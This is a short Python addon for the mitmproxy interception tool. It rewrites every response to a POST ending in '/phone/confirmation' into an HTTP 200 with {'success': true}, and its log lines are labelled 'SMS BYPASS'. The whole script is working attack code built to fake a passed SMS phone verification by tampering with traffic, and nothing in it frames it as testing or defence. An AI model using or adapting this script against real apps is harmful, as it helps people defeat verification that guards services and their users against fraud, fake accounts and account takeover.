from mitmproxy import http
import json

def response(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url.endswith("/phone/confirmation") and flow.request.method == "POST":
        print(f"[SMS BYPASS] Original: {flow.response.status_code} {flow.response.get_text()}")
        flow.response.status_code = 200
        flow.response.headers["content-type"] = "application/json"
        flow.response.set_text(json.dumps({"success": True}))
        print("[SMS BYPASS] -> 200 {success: true}")
